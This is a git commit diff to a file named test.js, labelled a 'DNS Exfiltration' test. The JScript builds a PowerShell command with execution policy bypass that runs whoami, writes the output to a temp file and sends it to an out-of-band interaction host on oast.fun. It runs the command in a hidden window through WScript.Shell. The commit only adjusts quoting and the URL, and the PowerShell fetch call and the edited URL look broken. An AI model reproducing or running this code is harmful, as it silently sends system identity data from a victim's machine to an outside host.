1589079fb557ccee89b0ba6b64b9990349de05f4
cantdothis2 <muhamedtafech202@gmail.com>
2025-11-01 04:17:38 +1100

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
 // DNS Exfiltration - whoami via PowerShell
-var cmd = 'powershell -nop -exec bypass -c "whoami | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt; fetch('http://rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun' + $content)"';
+var cmd = 'powershell -nop -exec bypass -c "whoami | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt; fetch(\\'http:rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun/\\' + $content)"';
 var shell = new ActiveXObject("WScript.Shell");
 shell.Run(cmd, 0, false);
